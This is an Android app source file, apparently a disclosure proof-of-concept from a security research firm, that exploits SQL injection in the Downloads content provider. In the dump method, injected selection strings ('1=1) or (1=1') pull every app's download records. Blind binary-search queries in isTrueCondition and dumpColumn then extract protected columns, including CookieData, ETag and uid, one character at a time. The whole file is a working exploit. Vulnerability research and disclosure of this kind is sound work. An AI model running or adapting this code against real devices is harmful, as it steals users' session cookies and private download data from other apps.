package com.ioactive.downloadProviderDbDumper;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.View;
import android.widget.Switch;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {
    // Adjustable priority for the "dump info" thread (-20 = maximum priority)
    private static final int THREAD_PRIORITY = -20;

    private static final String TAG = "DownProvDbDumper";
    private static final String LOG_SEPARATOR = "\n**********************************\n";

    private static final String MY_DOWNLOADS_URI = "content://downloads/my_downloads/";
    //private static final String MY_DOWNLOADS_URI = "content://downloads/download/"; // Works as well

    private TextView mTextViewLog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mTextViewLog = findViewById(R.id.textViewLog);
        mTextViewLog.setMovementMethod(new ScrollingMovementMethod());
    }

    private synchronized void log(final String text) {
        Log.d(TAG, text);

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                mTextViewLog.append(text + "\n");
            }
        });
    }

    public void buttonDump_Click(View view) {
        new Thread(new Runnable() {
            public void run() {
                android.os.Process.setThreadPriority(THREAD_PRIORITY);

                try {
                    Switch switchProtectedCols = findViewById(R.id.switchProtectedCols);
                    dump(switchProtectedCols.isChecked());
                } catch (Exception e) {
                    Log.e(TAG, "Error", e);
                    log(e.toString());
                }
            }
        }).start();
    }

    private void dump(boolean dumpProtectedColumns) {
        ContentResolver res = getContentResolver();
        Uri uri = Uri.parse(MY_DOWNLOADS_URI);
        Cursor cur;

        try {
            cur = res.query(uri, null, "1=1) or (1=1", null, null);
        } catch (IllegalArgumentException e) {
            Log.e(TAG, "Error", e);
            log("ERROR: The device does not appear to be vulnerable");
            return;
        }

        try {
            if (cur != null && cur.getCount() > 0) {
                // Iterate all results and display some fields for each row from the downloads database
                while (cur.moveToNext()) {
                    int rowId = cur.getInt(cur.getColumnIndex("_id"));
                    String rowData = cur.getString(cur.getColumnIndex("_data"));
                    String rowUri = cur.getString(cur.getColumnIndex("uri"));
                    String rowTitle = cur.getString(cur.getColumnIndex("title"));
                    String rowDescription = cur.getString(cur.getColumnIndex("description"));

                    StringBuilder sb = new StringBuilder(LOG_SEPARATOR);
                    sb.append("DOWNLOAD ID ").append(rowId);
                    sb.append("\nData: ").append(rowData);
                    sb.append("\nUri: ").append(rowUri);
                    sb.append("\nTitle: ").append(rowTitle);
                    sb.append("\nDescription: ").append(rowDescription);

                    if (dumpProtectedColumns) {
                        int uid = binarySearch(rowId, "uid");
                        sb.append("\nUID: ").append(uid);

                        dumpColumn(rowId, "CookieData", sb);
                        dumpColumn(rowId, "ETag", sb);
                    }

                    log(sb.toString());
                }
                log("\n\nDUMP FINISHED");
            }
        } finally {
            if (cur != null)
                cur.close();
        }
    }

    private void dumpColumn(int rowId, String columnName, StringBuilder sb) {
        if (isTrueCondition(rowId, "length(" + columnName + ") > 0")) {
            int len = binarySearch(rowId, "length(" + columnName + ")");

            sb.append("\n" + columnName + ": ");
            for (int i = 1; i <= len; i++) {
                int c = binarySearch(rowId, "unicode(substr(" + columnName + "," + i + ",1))");
                String newChar = Character.toString((char) c);
                sb.append(newChar);
            }
        }
    }

    private int binarySearch(int id, String sqlExpression) {
        int min = 0;
        int max = 20000;
        int mid = 0;

        while (min + 1 < max) {
            mid = (int) Math.floor((double) (max + min) / 2);

            if (isTrueCondition(id, sqlExpression + ">" + mid))
                min = mid;
            else
                max = mid;
        }

        if ((mid == max) && isTrueCondition(id, sqlExpression + "=" + mid))
            return mid;
        else if (isTrueCondition(id, sqlExpression + "=" + (mid + 1))) // Extra check
            return mid + 1;

        return -1;
    }

    private boolean isTrueCondition(int rowId, String sqlCondition) {
        ContentResolver res = getContentResolver();
        Uri uri = Uri.parse(MY_DOWNLOADS_URI);

        Cursor cur = res.query(uri, new String[]{"_id"}, "_id=" + rowId + ") and (" +
                sqlCondition + ") or (1=1", null, null);

        try {
            return (cur != null && cur.getCount() > 0);
        } finally {
            if (cur != null)
                cur.close();
        }
    }

}
